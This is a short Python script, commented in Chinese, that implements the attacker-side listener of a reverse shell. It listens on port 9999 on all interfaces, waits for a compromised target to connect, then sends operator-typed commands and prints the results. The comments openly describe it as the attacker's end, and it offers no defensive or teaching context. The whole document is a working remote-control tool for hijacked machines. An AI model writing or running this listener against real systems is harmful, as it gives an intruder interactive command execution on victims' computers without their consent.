import socket

# 攻擊者端監聽指定的 IP 和端口
server_ip = '0.0.0.0'  # 監聽所有接口
server_port = 9999     # 監聽端口

def start_reverse_shell_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((server_ip, server_port))
    s.listen(1)
    print(f"Listening on {server_ip}:{server_port}")
    
    client_socket, client_address = s.accept()
    print(f"Connection from {client_address}")
    
    # 發送命令給目標系統
    while True:
        command = input("Shell> ")
        if command.lower() == 'exit':
            client_socket.send(b'exit')
            break
        client_socket.send(command.encode())
        result = client_socket.recv(4096)
        print(result.decode())

    client_socket.close()

# 開始監聽
start_reverse_shell_server()
